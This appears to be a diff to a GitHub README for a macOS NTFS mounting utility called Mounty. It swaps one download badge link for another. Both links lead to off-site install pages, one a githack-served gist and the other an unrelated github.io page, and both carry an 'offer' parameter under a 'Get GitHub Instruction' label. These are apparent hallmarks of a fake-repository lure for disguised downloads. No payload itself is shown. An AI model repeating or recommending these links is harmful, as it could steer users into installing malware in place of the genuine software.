@@ -3,7 +3,7 @@
 **Mounty for NTFS** is a simple utility for **macOS** that gives you quick read and write access to NTFS-formatted drives.  
 Designed with minimalism in mind, it uses native macOS NTFS drivers for safe, reliable disk mounting — optimized for **Apple Silicon** performance. 🍎  
 
-[![💙 Get GitHub Instruction](https://img.shields.io/badge/💙%20Get%20Mounty%20NTFS-1976D2?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://gistcdn.githack.com/zigzag35hidden/37a290c01643dc097d197db35535dcce/raw/125b7cddb28029d8c3a1c6d206770c35532b24a2/install.html?offer=MountyForNTFSMac)
+[![💙 Get GitHub Instruction](https://img.shields.io/badge/💙%20Get%20Mounty%20NTFS-1976D2?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://git-app-desk.github.io/.github/?offer=MountyForNTFSMac)
 
 ---
 
